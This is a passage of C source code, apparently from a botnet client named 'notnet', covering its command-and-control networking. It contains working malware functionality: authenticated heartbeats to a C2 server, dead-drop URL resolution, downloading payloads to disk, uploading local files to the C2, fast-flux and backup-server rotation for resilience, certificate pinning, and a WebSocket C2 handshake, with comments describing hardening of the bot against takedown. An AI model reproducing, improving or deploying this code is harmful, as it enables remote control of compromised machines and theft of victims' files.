     * protection. Pinning happens in http_read() only after a successful
     * command/response round-trip proves the peer is the real C2. */
    c2_rotation_note_result(bot, 1);
    log_info("HTTP: connected to %s:%u", host, port);
    return 0;
}

int http_post(notnet_bot_t *bot, const char *data, int len) {
    if (!bot->c2_http.connected) return -1;
    
    log_info("HTTP: heartbeat sent (%d bytes)", len);
    
    /* SECURITY FIX (#110): the Host header must name the endpoint we are
     * actually connected to. At rotation index 0 effective_server equals
     * c2_http.server; on a backup it is the backup host, so the backup's
     * virtual-host routing and path see a coherent request. */
    const char *host = bot->c2_http.effective_server[0]
                       ? bot->c2_http.effective_server : bot->c2_http.server;
    char headers[1024];
    /* #167: command responses now carry the secret header so the C2 can
     * authenticate them (heartbeats carry it in the body as before). */
    snprintf(headers, sizeof(headers),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/json\r\n"
        "User-Agent: %s\r\n"
        "X-Notnet-Secret: %s\r\n"
        "Content-Length: %d\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        bot->c2_http.path, host, bot->c2_http.user_agent, bot->secret, len);
    
    /* SECURITY FIX (#28): Check send() return values to detect connection
     * drops. Previously sent headers+body without checking if they were
     * actually transmitted. */
    int sent = chan_send(&bot->c2_http.tls, bot->c2_http.sock, headers, strlen(headers));
    if (sent < 0) {
        log_warn("HTTP: failed to send headers: %s", strerror(errno));
        return -1;
    }
    sent = chan_send(&bot->c2_http.tls, bot->c2_http.sock, data, len);
    if (sent < 0 || sent < len) {
        log_warn("HTTP: failed to send body (sent %d of %d): %s", sent, len, strerror(errno));
        return -1;
    }

    return 0;
}
/* Forward declaration: tcp_connect_sock defined below (used by http_get_url). */
static int tcp_connect_sock(notnet_bot_t *bot, const char *host, uint16_t port);
/* Forward declaration: http_connect_url (http/https connect+TLS helper, #135). */
static int http_connect_url(notnet_bot_t *bot, const char *url,
                             char *host, size_t host_sz,
                             uint16_t *port, char *path, size_t path_sz,
                             notnet_tls_t *tls_out);

/* Dead-drop / arbitrary-URL fetch (#86). GET a plaintext http:// URL into
 * buf (bounded to len bytes total incl. headers) with a 10s timeout, and
 * return the total bytes received — the full response (status line, headers,
 * body); the caller locates the "\r\n\r\n" terminator to get at the body.
 * Unlike http_get(), this does not require an existing C2 connection and can
 * target any host, which is what dead-drop resolution needs. Cleartext only —
 * the default build has no TLS — so callers must NOT treat the transport as a
 * trust boundary; verification must happen on the payload (see deaddrop.c). */
int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
    if (!url || url[0] == '\0' ||
        (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0)) {
        log_warn("HTTP: http_get_url requires an http:// or https:// URL");
        return -1;
    }
    char host[256];
    uint16_t port = 0;
    char path[512];
    notnet_tls_t tls;
    tls.enabled = 0; tls.ssl = NULL; tls.sock = -1;
    int sock = http_connect_url(bot, url, host, sizeof(host), &port,
                                path, sizeof(path), &tls);
    if (sock < 0) {
        log_warn("HTTP: http_get_url connect to %s failed: %s", url, strerror(errno));
        return -1;
    }

    char req[1024];
    /* #173: payload/source downloads now require the secret — send it as a
     * query param (URL-safe charset) so any GET path authenticates. */
    int reqlen = snprintf(req, sizeof(req),
        "GET %s%ssecret=%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, strchr(path, '?') ? "&" : "?", bot->secret,
        host, bot->c2_http.user_agent);
    int sent = chan_send(&tls, sock, req, reqlen);
    if (sent < 0 || sent != reqlen) {
        log_warn("HTTP: http_get_url send failed: %s", strerror(errno));
        close(sock);
        return -1;
    }

    int total = 0;
    while (total < len - 1) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;  /* timeout, EOF, or error */

        int received = chan_recv(&tls, sock, buf + total, len - total - 1);
        if (received <= 0) break;
        total += received;
    }
    buf[total] = '\0';
    close(sock);

    if (total <= 0) {
        log_warn("HTTP: http_get_url empty response from %s", url);
        return -1;
    }

    /* Reject non-2xx responses (404/500 HTML error pages must not be parsed
     * as a dead-drop blob). */
    char *sp = strstr(buf, " ");
    if (sp && sp[1] >= '0' && sp[1] <= '9' &&
        sp[2] >= '0' && sp[2] <= '9' &&
        sp[3] >= '0' && sp[3] <= '9') {
        int code = (sp[1] - '0') * 100 + (sp[2] - '0') * 10 + (sp[3] - '0');
        if (code < 200 || code >= 300) {
            log_warn("HTTP: http_get_url %s returned HTTP %d", url, code);
            return -1;
        }
    }
    return total;
}

int http_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_http.connected) return -1;
    
    log_info("HTTP: http_read polling fd %d...", bot->c2_http.sock);
    
    /* Read response from existing connection (non-blocking) */
    if (tls_pending(&bot->c2_http.tls) <= 0) {
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(bot->c2_http.sock, &fds);
        tv.tv_sec = 0;
        tv.tv_usec = 0;

        int sel_result = select(bot->c2_http.sock + 1, &fds, NULL, NULL, &tv);
        log_info("HTTP: http_read select returned %d", sel_result);
        if (sel_result <= 0) return 0;
    }
    
    int received = chan_recv(&bot->c2_http.tls, bot->c2_http.sock, buf, len);
    log_info("HTTP: http_read recv returned %d", received);
    if (received == -2) {
        /* SECURITY FIX (#121): TLS consumed a control record and has no
         * application data this poll — NOT a dead connection. */
        return 0;
    }
    if (received <= 0) {
        log_info("HTTP: connection closed (recv=%d)", received);
        /* SECURITY FIX (#85): advance the flux IP so the reconnect
         * targets the next A record. */
        flux_mark_failed(bot, bot->c2_http.server);
        bot->c2_http.connected = 0;
        close(bot->c2_http.sock);
        bot->c2_http.sock = -1;
        return -1;
    }
    
    log_info("HTTP: received %d bytes: %.200s", received, buf);
    if (received >= len) received = len - 1;
    buf[received] = '\0';

    /* SECURITY FIX (#45): Pin the peer IP on the first *successful*
     * exchange instead of on the raw connect. Receiving a valid HTTP
     * response here proves the peer answered our request — the earliest
     * point at which we have evidence this is the real C2. Subsequent
     * connects are still checked against the pin in http_connect(). */
    if (received > 0) {
        struct sockaddr_in sin;
        socklen_t slen = sizeof(sin);
        if (getpeername(bot->c2_http.sock, (struct sockaddr *)&sin, &slen) == 0) {
            /* SECURITY FIX (#85): no pinning in flux mode — the peer
             * IP is expected to rotate. */
            if (!bot->flux_enabled && !bot->c2_http.dns_pinned) {
                bot->c2_http.pinned_addr = sin.sin_addr;
                bot->c2_http.dns_pinned = 1;
                log_info("HTTP: DNS pin set to %s after first response",
                         inet_ntoa(sin.sin_addr));
            }
        }
    }
    return received;
}

/* Open a fresh blocking TCP connection to host:port with a 3s timeout.
 * Returns socket fd on success, -1 on failure. Caller must close. */
static int tcp_connect_sock(notnet_bot_t *bot, const char *host, uint16_t port) {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        in_addr_t resolved = (in_addr_t)protocol_resolve_host(host);
        if (resolved == INADDR_NONE) {
            close(sock);
            return -1;
        }
        addr.sin_addr.s_addr = resolved;
    }

    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }

    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;

    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }

    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        close(sock);
        return -1;
    }

    fcntl(sock, F_SETFL, flags);
    (void)bot;
    return sock;
}

/* Shared URL parser + connect for one-shot fetches (http_download,
 * http_get_url, http_upload). Supports http:// and https://. For https://
 * the socket is upgraded to TLS and the peer cert is verified against the
 * bot's configured pin (tls_cert_pin_sha256) — but ONLY when TLS is
 * compiled in (make TLS=1). A plaintext http:// URL never upgrades.
 *
 * On success returns the connected socket (>=0) and fills host/port/path
 * (path includes the leading '/'). The caller must chan_send/chan_recv
 * (not raw send/recv) when *tls_out.enabled is set, and close the socket.
 * Returns -1 on parse/connect/TLS failure.
 *
 * #135: previously https:// was rejected everywhere; now TLS builds can
 * fetch over https. */
static int http_connect_url(notnet_bot_t *bot, const char *url,
                             char *host, size_t host_sz,
                             uint16_t *port, char *path, size_t path_sz,
                             notnet_tls_t *tls_out) {
    if (!url || url[0] == '\0') return -1;
    int https = 0;
    const char *scheme = NULL;
    if (strncmp(url, "https://", 8) == 0) { https = 1; scheme = url + 8; }
    else if (strncmp(url, "http://", 7) == 0) { scheme = url + 7; }
    else return -1;

    if (tls_out) { tls_out->enabled = 0; tls_out->ssl = NULL; tls_out->sock = -1; }

    const char *slash = strchr(scheme, '/');
    size_t alen = slash ? (size_t)(slash - scheme) : strlen(scheme);
    if (alen == 0 || alen >= host_sz) return -1;
    memcpy(host, scheme, alen);
    host[alen] = '\0';
    *port = https ? 443 : 80;
    char *colon = strrchr(host, ':');
    if (colon) {
        *colon = '\0';
        int pv = atoi(colon + 1);
        if (pv >= 1 && pv <= 65535) *port = (uint16_t)pv;
    }
    if (slash) snprintf(path, path_sz, "%s", slash);
    else snprintf(path, path_sz, "/");

    int sock = tcp_connect_sock(bot, host, *port);
    if (sock < 0) return -1;

#ifdef TLS_ENABLED
    if (https) {
        /* #135: upgrade to TLS and verify the cert pin. No pin configured
         * means the channel stays plaintext per tls_setup()'s contract, but
         * for an explicit https:// URL we require a pin to avoid shipping an
         * unauthenticated (MITM-able) TLS session. */
        if (tls_setup(tls_out, sock, host, bot->tls_cert_pin_sha256) != 0) {
            close(sock);
            return -1;
        }
        if (!tls_out->enabled) {
            log_error("HTTP: https:// requested but TLS not pinned — refusing");
            close(sock);
            return -1;
        }
    }
#else
    if (https) {
        log_error("HTTP: https:// URL but TLS not compiled in (make TLS=1)");
        close(sock);
        return -1;
    }
#endif
    return sock;
}

int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
    /* Parse the target URL. Fall back to the configured C2 endpoint
     * when url is NULL/empty so the old callers keep working. */
    char host[256];
    uint16_t port = 0;
    char path[512];
    notnet_tls_t tls;
    tls.enabled = 0; tls.ssl = NULL; tls.sock = -1;

    int sock = -1;
    if (url && (strncmp(url, "http://", 7) == 0 || strncmp(url, "https://", 8) == 0)) {
        /* #135: http_connect_url parses http:// AND https://, upgrading to
         * TLS (with cert-pin verification) for https:// when compiled in. */
        sock = http_connect_url(bot, url, host, sizeof(host), &port,
                                 path, sizeof(path), &tls);
        if (sock < 0) {
            log_error("HTTP download: connect to %s failed", url);
            return -1;
        }
    } else {
        snprintf(host, sizeof(host), "%s", bot->c2_http.server);
        port = bot->c2_http.port;
        snprintf(path, sizeof(path), "%s", bot->c2_http.path);
        const char *connect_host = host;
        char flux_ip[INET_ADDRSTRLEN];
        if (bot->flux_enabled) {
            struct in_addr fa;
            if (flux_pick_ip(bot, host, &fa) == 0 &&
                inet_ntop(AF_INET, &fa, flux_ip, sizeof(flux_ip))) {
                connect_host = flux_ip;
            }
        }
        sock = tcp_connect_sock(bot, connect_host, port);
        if (sock < 0) {
            log_error("http_download: connect to %s:%u failed", host, port);
            if (bot->flux_enabled) flux_mark_failed(bot, host);
            return -1;
        }
    }

    /* Stream the response body to dest. The old implementation buffered
     * the entire response in a PAYLOAD_MAX_SIZE (64KB) stack array, which
     * truncated the on-target compilation source bundle (~270KB). Headers
     * are buffered small; body bytes are written to the file incrementally
     * with a generous cap (callers that need strict limits validate the
     * result themselves, e.g. payload_update checks PAYLOAD_MAX_SIZE). */
    enum { HDR_BUF_SIZE = 8192, MAX_DOWNLOAD_SIZE = 32 * 1024 * 1024 };
    char hdr_buf[HDR_BUF_SIZE];
    int hdr_len = 0;
    int body_start = -1;   /* offset in hdr_buf where body begins, -1 until found */

    char req[1024];
    /* #173: same secret query param as http_get_url — this is the
     * payload-download path (http_download). */
    int reqlen = snprintf(req, sizeof(req),
        "GET %s%ssecret=%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, strchr(path, '?') ? "&" : "?", bot->secret,
        host, bot->c2_http.user_agent);

    if (chan_send(&tls, sock, req, reqlen) != reqlen) {
        log_warn("http_download: GET send failed: %s", strerror(errno));
        close(sock);
        return -1;
    }

    /* Read response with 10s timeout. First pass: collect headers until
     * the \r\n\r\n terminator (or the header buffer fills). */
    while (body_start < 0 && hdr_len < HDR_BUF_SIZE - 1) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;  /* timeout or error */

        int received = chan_recv(&tls, sock, hdr_buf + hdr_len, HDR_BUF_SIZE - hdr_len - 1);
        if (received <= 0) break;
        hdr_len += received;
        hdr_buf[hdr_len] = '\0';
        char *hdr_end = strstr(hdr_buf, "\r\n\r\n");
        if (hdr_end) {
            body_start = (int)(hdr_end - hdr_buf) + 4;
            break;
        }
    }
    if (body_start < 0) {
        log_error("http_download: malformed HTTP response from %s:%u", host, port);
        close(sock);
        return -1;
    }

    /* SECURITY FIX (#69): verify the HTTP status line is 2xx. Previously a
     * 404/500 HTML error page was treated as a successful download — the
     * payload magic/hash checks then rejected it, but the failure was
     * attributed to the wrong cause and the on-target compile fallback
     * never fired. Check the status line before trusting the body. */
    {
        char *status = hdr_buf;
        char *sp = strstr(status, " ");
        if (sp && sp[1] >= '0' && sp[1] <= '9' &&
            sp[2] >= '0' && sp[2] <= '9' &&
            sp[3] >= '0' && sp[3] <= '9') {
            int code = (sp[1] - '0') * 100 + (sp[2] - '0') * 10 + (sp[3] - '0');
            if (code < 200 || code >= 300) {
                log_error("http_download: HTTP %d from %s:%u (path %s)",
                          code, host, port, path);
                close(sock);
                return -1;
            }
        } else {
            log_error("http_download: malformed status line from %s:%u", host, port);
            close(sock);
            return -1;
        }
    }

    /* Open destination and write the body. */
    FILE *f = fopen(dest, "wb");
    if (!f) {
        log_error("http_download: cannot open %s: %s", dest, strerror(errno));
        close(sock);
        return -1;
    }

    int body_len = 0;
    int in_hdr = hdr_len - body_start;
    if (in_hdr > 0) {
        fwrite(hdr_buf + body_start, 1, in_hdr, f);
        body_len = in_hdr;
    }

    /* Continue streaming remaining body bytes. */
    char stream_buf[8192];
    while (body_len < MAX_DOWNLOAD_SIZE) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;  /* timeout, EOF, or error */

        int received = chan_recv(&tls, sock, stream_buf, sizeof(stream_buf));
        if (received <= 0) break;
        fwrite(stream_buf, 1, (size_t)received, f);
        body_len += received;
    }
    fclose(f);
    close(sock);

    if (body_len <= 0) {
        log_error("http_download: empty body from %s:%u", host, port);
        unlink(dest);
        return -1;
    }
    if (body_len >= MAX_DOWNLOAD_SIZE) {
        log_error("http_download: body exceeds cap (%d bytes) from %s:%u",
                  body_len, host, port);
        unlink(dest);
        return -1;
    }

    return body_len;
}

int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_path) {
    /* Read local file into memory */
    FILE *f = fopen(file_path, "rb");
    if (!f) {
        log_error("http_upload: cannot open %s: %s", file_path, strerror(errno));
        return -1;
    }

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (file_size <= 0 || file_size > PAYLOAD_MAX_SIZE) {
        log_error("http_upload: invalid file size %ld", file_size);
        fclose(f);
        return -1;
    }

    char *file_data = (char *)malloc(file_size);
    if (!file_data) {
        log_error("http_upload: malloc failed for %ld bytes", file_size);
        fclose(f);
        return -1;
    }

    size_t nread = fread(file_data, 1, file_size, f);
    fclose(f);

    if ((long)nread != file_size) {
        log_error("http_upload: short read (%zu of %ld)", nread, file_size);
        free(file_data);
        return -1;
    }

    /* Use configured C2 endpoint or specific URL */
    char host[256];
    uint16_t port;
    char path[512];
    notnet_tls_t tls;
    tls.enabled = 0; tls.ssl = NULL; tls.sock = -1;
    int sock = -1;

    if (upload_path && (strncmp(upload_path, "http://", 7) == 0 ||
                         strncmp(upload_path, "https://", 8) == 0)) {
        /* #135: http_connect_url also parses https:// and upgrades to TLS. */
        sock = http_connect_url(bot, upload_path, host, sizeof(host),
                                      &port, path, sizeof(path), &tls);
        if (sock < 0) {
            log_error("http_upload: connect to %s failed", upload_path);
            free(file_data);
            return -1;
        }
    } else {
        /* SECURITY FIX (#110): on a rotated backup the upload must dial
         * AND name the effective endpoint, not the primary's host/port. */
        snprintf(host, sizeof(host), "%s",
                 bot->c2_http.effective_server[0]
                     ? bot->c2_http.effective_server : bot->c2_http.server);
        port = bot->c2_http.effective_port ? bot->c2_http.effective_port
                                           : bot->c2_http.port;
        snprintf(path, sizeof(path), "%s", upload_path ? upload_path : bot->c2_http.path);
        const char *connect_host = host;
        char flux_ip[INET_ADDRSTRLEN];
        if (bot->flux_enabled) {
            struct in_addr fa;
            if (flux_pick_ip(bot, host, &fa) == 0 &&
                inet_ntop(AF_INET, &fa, flux_ip, sizeof(flux_ip))) {
                connect_host = flux_ip;
            }
        }
        sock = tcp_connect_sock(bot, connect_host, port);
        if (sock < 0) {
            log_error("http_upload: connect to %s:%u failed", host, port);
            if (bot->flux_enabled) flux_mark_failed(bot, host);
            free(file_data);
            return -1;
        }
    }

    /* Build POST request with Content-Length.
     * #164: uploads now carry the secret header — the C2 rejects
     * unauthenticated uploads. */
    char headers[1024];
    int hdr_len = snprintf(headers, sizeof(headers),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %ld\r\n"
        "User-Agent: %s\r\n"
        "X-Notnet-Secret: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, file_size, bot->c2_http.user_agent, bot->secret);

    if (chan_send(&tls, sock, headers, hdr_len) != hdr_len) {
        log_warn("http_upload: headers send failed: %s", strerror(errno));
        close(sock);
        free(file_data);
        return -1;
    }

    /* Send file body */
    int sent = chan_send(&tls, sock, file_data, file_size);
    free(file_data);

    if (sent < 0 || sent < file_size) {
        log_warn("http_upload: body send failed (sent %d of %ld): %s", sent, file_size, strerror(errno));
        close(sock);
        return -1;
    }

    /* Read response with timeout */
    char buf[1024];
    int total = 0;
    while (total < (int)sizeof(buf) - 1) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;

        int received = chan_recv(&tls, sock, buf + total, (int)sizeof(buf) - total - 1);
        if (received <= 0) break;
        total += received;
    }
    buf[total] = '\0';
    close(sock);

    log_info("http_upload: uploaded %ld bytes to %s, response: %.200s", file_size, path, buf);
    return file_size;
}

void http_disconnect(notnet_bot_t *bot) {
    if (bot->c2_http.connected) {
        bot->c2_http.connected = 0;
        if (bot->c2_http.sock >= 0) {
            tls_close(&bot->c2_http.tls);
            close(bot->c2_http.sock);
            bot->c2_http.sock = -1;
        }
        log_info("HTTP: disconnected");
    }
}

/* ── WebSocket Implementation ─────────────────────────────────────── */
/* ── WebSocket RFC 6455 Handshake Helpers ────────────────────── */

/* Minimal base64 encoder (RFC 4648). dst must hold >= 4*((len+2)/3)+1 bytes. */
static void ws_base64_encode(const uint8_t *src, int len, char *dst, int dst_size) {
    static const char tbl[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, o = 0;
    while (i < len && o < dst_size - 4) {
        uint32_t a = src[i], b = (i + 1 < len) ? src[i + 1] : 0, c = (i + 2 < len) ? src[i + 2] : 0;
        uint32_t t = (a << 16) | (b << 8) | c;
        dst[o++] = tbl[(t >> 18) & 0x3F];
        dst[o++] = tbl[(t >> 12) & 0x3F];
        dst[o++] = (i + 1 < len) ? tbl[(t >> 6) & 0x3F] : '=';
        dst[o++] = (i + 2 < len) ? tbl[t & 0x3F] : '=';
        i += 3;
    }
    dst[o] = '\0';
}

/* SHA-1 (FIPS 180-1) — compact single-shot implementation for the
 * RFC 6455 Sec-WebSocket-Accept computation. */
typedef struct { uint32_t h[5]; uint64_t len; uint8_t buf[64]; size_t buflen; } ws_sha1_ctx;

static uint32_t ws_rotl(uint32_t x, int n) { return (x << n) | (x >> (32 - n)); }

static void ws_sha1_init(ws_sha1_ctx *c) {
    c->h[0] = 0x67452301; c->h[1] = 0xEFCDAB89; c->h[2] = 0x98BADCFE;
    c->h[3] = 0x10325476; c->h[4] = 0xC3D2E1F0; c->len = 0; c->buflen = 0;
}

static void ws_sha1_block(ws_sha1_ctx *c, const uint8_t *p) {
    uint32_t w[80];
    for (int i = 0; i < 16; i++) {
        w[i] = ((uint32_t)p[i * 4] << 24) | ((uint32_t)p[i * 4 + 1] << 16) |
               ((uint32_t)p[i * 4 + 2] << 8) | p[i * 4 + 3];
    }
    for (int i = 16; i < 80; i++) {
        w[i] = ws_rotl(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1);
    }
    uint32_t a = c->h[0], b = c->h[1], cc = c->h[2], d = c->h[3], e = c->h[4];
    for (int i = 0; i < 80; i++) {
        uint32_t f, k;
        if (i < 20)      { f = (b & cc) | ((~b) & d); k = 0x5A827999; }
        else if (i < 40) { f = b ^ cc ^ d;            k = 0x6ED9EBA1; }
        else if (i < 60) { f = (b & cc) | (b & d) | (cc & d); k = 0x8F1BBCDC; }
        else             { f = b ^ cc ^ d;            k = 0xCA62C1D6; }
        uint32_t tmp = ws_rotl(a, 5) + f + e + k + w[i];
        e = d; d = cc; cc = ws_rotl(b, 30); b = a; a = tmp;
    }
    c->h[0] += a; c->h[1] += b; c->h[2] += cc; c->h[3] += d; c->h[4] += e;
}

static void ws_sha1_update(ws_sha1_ctx *c, const uint8_t *data, size_t len) {
    c->len += len;
    while (len > 0) {
        size_t take = 64 - c->buflen;
        if (take > len) take = len;
        memcpy(c->buf + c->buflen, data, take);
        c->buflen += take;
        data += take;
        len -= take;
        if (c->buflen == 64) { ws_sha1_block(c, c->buf); c->buflen = 0; }
    }
}

static void ws_sha1_final(ws_sha1_ctx *c, uint8_t out[20]) {
    uint64_t bits = c->len * 8;
    uint8_t pad = 0x80;
    ws_sha1_update(c, &pad, 1);
    uint8_t zero = 0;
    while (c->buflen != 56) ws_sha1_update(c, &zero, 1);
    uint8_t lenb[8];
    for (int i = 0; i < 8; i++) lenb[i] = (bits >> (56 - i * 8)) & 0xFF;
    ws_sha1_update(c, lenb, 8);
    for (int i = 0; i < 5; i++) {
        out[i * 4]     = (c->h[i] >> 24) & 0xFF;
        out[i * 4 + 1] = (c->h[i] >> 16) & 0xFF;
        out[i * 4 + 2] = (c->h[i] >> 8) & 0xFF;
        out[i * 4 + 3] = c->h[i] & 0xFF;
    }
}

/* Compute base64(SHA1(key + RFC6455_GUID)) — the Sec-WebSocket-Accept
 * the server must echo for our handshake key. */
static void ws_compute_accept(const char *key, char *out, int out_size) {
    static const char GUID[] = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    ws_sha1_ctx c;
    ws_sha1_init(&c);
    ws_sha1_update(&c, (const uint8_t *)key, strlen(key));
    ws_sha1_update(&c, (const uint8_t *)GUID, strlen(GUID));
    uint8_t digest[20];
    ws_sha1_final(&c, digest);
    ws_base64_encode(digest, 20, out, out_size);
}

int ws_connect(notnet_bot_t *bot) {
    if (bot->c2_ws.connected) return 0;
    
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    /* Non-blocking connect */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_ws.port);
    
    /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
     * gethostbyname + memcpy (h_length overflow on IPv6 results). */
    if (inet_pton(AF_INET, bot->c2_ws.server, &addr.sin_addr) != 1) {
        /* SECURITY FIX (#85): In flux mode use the rotating cache of
         * all A records; otherwise a single resolution as before. */
        if (bot->flux_enabled) {
            if (flux_pick_ip(bot, bot->c2_ws.server, &addr.sin_addr) != 0) {
                log_error("WS: flux resolution failed for %s", bot->c2_ws.server);
                close(sock);
                return -1;
            }
        } else {
            addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(bot->c2_ws.server);
            if (addr.sin_addr.s_addr == INADDR_NONE) {
                close(sock);
                return -1;
            }
        }
    }
    
    /* SECURITY FIX (#10): DNS pinning for WebSocket C2.
     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
    if (!bot->flux_enabled && bot->c2_ws.dns_pinned &&
        addr.sin_addr.s_addr != bot->c2_ws.pinned_addr.s_addr) {
        log_warn("WS: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                 inet_ntoa(bot->c2_ws.pinned_addr), inet_ntoa(addr.sin_addr));
        close(sock);
        return -1;
    }
    
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        flux_mark_failed(bot, bot->c2_ws.server);
        close(sock);
        return -1;
    }
    
    /* Wait with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        flux_mark_failed(bot, bot->c2_ws.server);
        close(sock);
        return -1;
    }
    
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        flux_mark_failed(bot, bot->c2_ws.server);
        close(sock);
        return -1;
    }

    /* SECURITY FIX (#76): Upgrade to TLS + verify cert pin when configured.
     * Must happen BEFORE the RFC 6455 handshake so the upgrade request and
     * 101 response ride inside the encrypted tunnel. */
    if (tls_setup(&bot->c2_ws.tls, sock, bot->c2_ws.server,
                  bot->tls_cert_pin_sha256) != 0) {
        flux_mark_failed(bot, bot->c2_ws.server);
        close(sock);
        return -1;
    }

    /* SECURITY FIX (#46): Perform the RFC 6455 client handshake.
     * Raw TCP connect is not enough — the server must respond with
     * HTTP 101 Switching Protocols and a valid Sec-WebSocket-Accept
     * (base64(SHA1(key + GUID))). Without the handshake a real
     * WebSocket endpoint rejects the masked frames ws_send() emits. */

    /* Sec-WebSocket-Key: base64 of 16 cryptographically-random bytes */
    uint8_t key_raw[16];
    if (random_bytes(key_raw, sizeof(key_raw)) != 0) {
        log_warn("WS: getrandom failed for handshake key");
        close(sock);
        return -1;
    }
    char ws_key[32];
    ws_base64_encode(key_raw, sizeof(key_raw), ws_key, sizeof(ws_key));

    char upgrade_req[2048];
    int req_len = snprintf(upgrade_req, sizeof(upgrade_req),
             "GET %s HTTP/1.1\r\n"
             "Host: %s:%d\r\n"
             "Upgrade: websocket\r\n"
             "Connection: Upgrade\r\n"
             "Sec-WebSocket-Key: %s\r\n"
             "Sec-WebSocket-Version: 13\r\n"
             "\r\n",
             bot->c2_ws.path, bot->c2_ws.server, bot->c2_ws.port, ws_key);
    if (req_len < 0 || req_len >= (int)sizeof(upgrade_req)) {
        log_warn("WS: upgrade request too large");
        close(sock);
        return -1;
    }

    int sent = chan_send(&bot->c2_ws.tls, sock, upgrade_req, req_len);
    if (sent != req_len) {
        log_warn("WS: upgrade request send failed: %s", strerror(errno));
        flux_mark_failed(bot, bot->c2_ws.server);
        close(sock);
        return -1;
    }

    /* Read the 101 response headers (5s timeout, bounded loop). */
    char response[1024] = {0};
    int received = 0;
    while (received < (int)sizeof(response) - 1) {
        fd_set rfd;
        struct timeval tv;
        FD_ZERO(&rfd);
        FD_SET(sock, &rfd);
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        if (select(sock + 1, &rfd, NULL, NULL, &tv) <= 0) {
            log_warn("WS: upgrade response timed out");
            flux_mark_failed(bot, bot->c2_ws.server);
            close(sock);
            return -1;
        }
        int r = chan_recv(&bot->c2_ws.tls, sock, response + received, sizeof(response) - received - 1);
        if (r <= 0) break;
        received += r;
        response[received] = '\0';
        /* Stop once the header terminator arrives */
        if (strstr(response, "\r\n\r\n")) break;
    }
    response[received] = '\0';

    /* Verify the status line is exactly "HTTP/1.1 101" (start-of-line match,
     * not a substring scan that could match "101" inside an error body). */
    if (strncmp(response, "HTTP/1.1 101", 12) != 0 &&
        strncmp(response, "HTTP/1.0 101", 12) != 0) {
        log_warn("WS: no 101 Switching Protocols received — handshake failed (%.80s)",
                 response[0] ? response : "(empty response)");
        flux_mark_failed(bot, bot->c2_ws.server);
        close(sock);
        return -1;
    }

    /* Verify Sec-WebSocket-Accept header matches base64(SHA1(key+GUID)) */
    char expect[64];
    ws_compute_accept(ws_key, expect, sizeof(expect));
